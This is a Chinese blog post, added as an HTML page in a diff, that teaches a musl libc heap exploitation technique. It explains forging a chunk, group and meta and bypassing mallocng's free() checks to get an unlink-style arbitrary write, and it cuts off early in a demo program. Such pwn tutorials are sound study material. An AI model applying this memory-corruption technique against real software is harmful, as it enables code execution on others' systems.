@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。 musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的group和meta，因此除了构造假chunk外，还需要构造假group和假meta。如果在假meta中合理构造pr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="musl pwn 入门 (2)">
+<meta property="og:url" content="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/index.html">
+<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
+<meta property="og:description" content="在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。 musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的group和meta，因此除了构造假chunk外，还需要构造假group和假meta。如果在假meta中合理构造pr">
+<meta property="og:locale">
+<meta property="article:published_time" content="2023-02-28T14:27:46.000Z">
+<meta property="article:modified_time" content="2023-02-28T14:27:46.531Z">
+<meta property="article:author" content="CoLin">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>musl pwn 入门 (2) | CoLin's Pwnhome</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoLin's Pwnhome</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's Pwnhome">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          musl pwn 入门 (2)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:27:46" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:46+08:00">2023-02-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。</p>
+<p>musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的<code>group</code>和<code>meta</code>，因此除了构造假chunk外，还需要构造假<code>group</code>和假<code>meta</code>。如果在假<code>meta</code>中合理构造<code>prev</code>和<code>next</code>指针，在<code>nontrivial_free</code>中调用<code>dequeue</code>函数就可以实现这两个地址互相写。</p>
+<p>但在整个流程中，我们需要绕过很多检查，以及进入正确的分支。</p>
+<p>在<code>free</code>中会调用<code>nontrivial_free</code>，<code>free</code>中调用的<code>get_meta</code>函数中有一些检查项：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(/src/<span class="built_in">malloc</span>/mallocng/meta.h, line <span class="number">129</span>)</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>meta-&gt;mem &#x3D;&#x3D; base，即meta中保存的group指针要正确。</li>
+<li>index &lt;&#x3D; meta-&gt;last_idx，即chunk的索引不能越界。</li>
+<li>area-&gt;check &#x3D;&#x3D; ctx.secret，即meta所在的meta_area的校验值正确。</li>
+<li>offset &gt;&#x3D; size_classes[meta-&gt;sizeclass]*index</li>
+<li>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。</li>
+<li>assert(offset &lt;&#x3D; meta-&gt;maplen*4096UL&#x2F;UNIT - 1);，即检查offset是否越界。</li>
+</ol>
+<p>如果伪造的<code>meta</code>位于一个伪造的<code>meta_area</code>中，需要首先获取校验值<code>secret</code>并保存到<code>meta_area</code>开头，即这一页最开始的地方。</p>
+<p>通过这个函数的检查之后，<code>nontrivial_free</code>的分支语句：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里要求<code>mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)</code>，因此要合理设置<code>meta</code>的两个<code>mask</code>的值。</p>
+<p>之后调用了<code>free_group</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">		<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">		g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">		mi = nontrivial_free(m, idx);</span><br><span class="line">	&#125;</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们不能在if-else语句中跳转到else分支，那样会再一次调用<code>nontrivial_free</code>，因此要保证<code>meta</code>的<code>maplen</code>字段不为0。</p>
+<p>这些检查与条件判断通过后，就可以成功释放假chunk了。</p>
+<p>下面就是musl libc unlink漏洞的demo程序，如有任何非预期情况请与笔者联系，不胜感激。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_1[<span class="number">0x8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_2[<span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span 